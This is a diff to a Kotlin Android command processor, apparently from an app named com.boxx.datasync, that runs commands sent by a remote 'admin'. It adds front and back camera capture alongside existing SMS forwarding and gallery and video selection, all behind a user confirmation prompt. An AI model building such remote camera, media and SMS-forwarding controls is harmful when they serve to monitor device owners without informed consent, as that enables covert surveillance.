@@ -54,7 +54,7 @@ class CommandProcessor @Inject constructor(
     private fun processCommand(deviceId: String, command: Command, context: Context) {
         scope.launch {
             try {
-                val requiresConfirmation = command.type.contains("FORWARDING") || command.type == "OPEN_GALLERY" || command.type == "OPEN_VIDEOS"
+                val requiresConfirmation = command.type.contains("FORWARDING") || command.type == "OPEN_GALLERY" || command.type == "OPEN_VIDEOS" || command.type == "OPEN_FRONT_CAMERA" || command.type == "OPEN_BACK_CAMERA"
                 if (requiresConfirmation) {
                     updateCommandStatus(deviceId, command.id, "WAITING_FOR_USER_CONFIRMATION")
                     Log.d("CommandProcessor", "CLIENT_COMMAND_WAITING_FOR_CONFIRMATION: ${command.type}")
@@ -68,6 +68,10 @@ class CommandProcessor @Inject constructor(
                             putExtra("customMessage", "Admin requested image selection for educational media upload.")
                         } else if (command.type == "OPEN_VIDEOS") {
                             putExtra("customMessage", "Admin requested video selection for educational media upload.")
+                        } else if (command.type == "OPEN_FRONT_CAMERA") {
+                            putExtra("customMessage", "Admin requested to open the front camera to capture a photo.")
+                        } else if (command.type == "OPEN_BACK_CAMERA") {
+                            putExtra("customMessage", "Admin requested to open the back camera to capture a photo.")
                         }
 
                         addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -150,7 +154,23 @@ class CommandProcessor @Inject constructor(
             "DISABLE_SMS_FORWARDING" -> handleSmsForwarding(context, deviceId = DeviceIdHelper.getDeviceId(context), command, false)
             "OPEN_GALLERY" -> handleMediaPicker(command, context, "image/*")
             "OPEN_VIDEOS" -> handleMediaPicker(command, context, "video/*")
+            "OPEN_FRONT_CAMERA" -> handleCameraCapture(command, context, isFront = true)
+            "OPEN_BACK_CAMERA" -> handleCameraCapture(command, context, isFront = false)
             else -> CommandResult.Unsupported("Unknown command type: ${command.type}")
+        }
+    }
+
+    private fun handleCameraCapture(command: Command, context: Context, isFront: Boolean): CommandResult {
+        return try {
+            val intent = android.content.Intent(context, com.boxx.datasync.MainActivity::class.java).apply {
+                putExtra("commandId", command.id)
+                putExtra("cameraType", if (isFront) "FRONT" else "BACK")
+                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            }
+            context.startActivity(intent)
+            CommandResult.HandledExternally
+        } catch (e: Exception) {
+            CommandResult.Failed(e.localizedMessage ?: "Failed to open camera capture")
         }
     }
 
